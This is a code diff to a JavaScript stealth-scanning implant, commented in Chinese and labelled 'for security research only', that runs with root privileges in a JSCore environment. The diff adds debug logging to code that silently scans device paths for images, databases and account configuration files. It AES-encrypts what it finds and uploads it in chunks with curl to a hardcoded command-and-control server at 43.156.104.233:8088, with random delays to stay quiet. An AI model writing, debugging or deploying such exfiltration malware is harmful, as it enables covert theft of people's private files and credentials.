@@ -1,6 +1,25 @@
 // 安全研究专用 —— root 隐身扫描文件（JSCore 兼容版）
 // 适配提权后的 JSCore 无浏览器 API 环境
-const server_url = "http://43.156.104.233";
+// ==============================================
+// 【配置】C2 服务器地址，请根据实际部署修改
+// 如果 server.js 运行在本地电脑，请改为电脑在局域网中的 IP
+// 例如：const server_url = "http://192.168.1.100:8088";
+// ==============================================
+const server_url = "http://43.156.104.233:8088";
+
+const DEBUG = true;
+const LOG_FILE = '/tmp/scan_debug.log';
+
+function LOG(msg) {
+    if (!DEBUG) return;
+    try {
+        const ts = new Date().toISOString();
+        const line = '[' + ts + '] ' + msg;
+        if (typeof __native_root_exec !== 'undefined') {
+            __native_root_exec('echo "' + line.replace(/"/g, '\\"') + '" >> ' + LOG_FILE);
+        }
+    } catch (e) {}
+}
 
 // ==============================================
 // 安全研究专用 · root 精准静默窃取（图片+数据库+账号配置）
@@ -107,9 +126,14 @@ function rand(min, max) {
 // ==============================================
 
 function stealthPreciseScan() {
+    LOG('=== stealthPreciseScan start ===');
+    LOG('server_url=' + server_url);
+    LOG('__native_root_exec exists=' + (typeof __native_root_exec !== 'undefined'));
     for (let i = 0; i < SCAN_PATHS.length; i++) {
+        LOG('scanDir: ' + SCAN_PATHS[i]);
         scanDir(SCAN_PATHS[i], 0);
     }
+    LOG('=== stealthPreciseScan end ===');
 }
 
 function scanDir(dir, depth) {
@@ -145,9 +169,12 @@ function scanDir(dir, depth) {
 
 function rootExec(cmd) {
     if (typeof __native_root_exec !== 'undefined') {
+        LOG('EXEC: ' + cmd.substring(0, 200));
         const result = __native_root_exec(cmd);
+        LOG('RESULT len=' + (result ? result.length : 0));
         return result || "";
     }
+    LOG('ERROR: __native_root_exec not defined');
     return "";
 }
 
@@ -157,13 +184,18 @@ function rootExec(cmd) {
 
 function uploadEncrypted(filePath, content) {
     try {
-        if (!content || content.length < 10) return;
+        if (!content || content.length < 10) {
+            LOG('SKIP: content too short for ' + filePath);
+            return;
+        }
+        LOG('UPLOAD start: ' + filePath + ' size=' + content.length);
         const safePath = btoa(unescape(encodeURIComponent(filePath)));
         const encryptedData = aesEncryptReal(content, "aes_key_16bytes_01");
+        LOG('ENCRYPTED len=' + encryptedData.length);
         const chunkSize = 4096;
         for (let i = 0; i < encryptedData.length; i += chunkSize) {
             const chunk = encryptedData.slice(i, i + chunkSize);
-            silentFetch(server_url + "/api/upload", {
+            const ok = silentFetch(server_url + "/api/upload", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -173,10 +205,12 @@ function uploadEncrypted(filePath, content) {
                     total: encryptedData.length
                 })
             });
+            LOG('UPLOAD chunk offset=' + i + ' ok=' + ok);
             sleep(Math.floor(Math.random() * 30 + 10));
         }
+        LOG('UPLOAD done: ' + filePath);
     } catch (e) {
-        // 静默失败，不打印日志、不抛异常
+        LOG('UPLOAD ERROR: ' + (e.message || String(e)));
     }
 }
 
@@ -227,13 +261,21 @@ function silentFetch(url, opt) {
         const body = opt.body || '';
         const contentType = (opt.headers && opt.headers['Content-Type']) || 'application/json';
         const tmpBody = '/tmp/.scan_body_' + Math.floor(Math.random() * 10000000);
+        const tmpResp = '/tmp/.scan_resp_' + Math.floor(Math.random() * 10000000);
         rootExec('printf \'%s\' \'' + escapeShell(body) + '\' > ' + tmpBody);
-        const cmd = 'curl -s -X ' + (opt.method || 'GET') +
+        const cmd = 'curl -s -w "\\nHTTP_CODE:%{http_code}" -X ' + (opt.method || 'GET') +
                     ' -H "Content-Type: ' + contentType + '"' +
                     ' -d @' + tmpBody +
                     ' -m 5 ' + url +
-                    ' >/dev/null 2>&1';
-        rootExec(cmd);
-        rootExec('rm -f ' + tmpBody);
-    } catch (_) {}
+                    ' -o ' + tmpResp + ' 2>&1';
+        const result = rootExec(cmd);
+        const httpCodeMatch = result.match(/HTTP_CODE:(\d+)/);
+        const httpCode = httpCodeMatch ? httpCodeMatch[1] : '??';
+        LOG('FETCH url=' + url + ' http_code=' + httpCode + ' result_len=' + result.length);
+        rootExec('rm -f ' + tmpBody + ' ' + tmpResp);
+        return httpCode === '200';
+    } catch (e) {
+        LOG('FETCH ERROR: ' + (e.message || String(e)));
+        return false;
+    }
 }
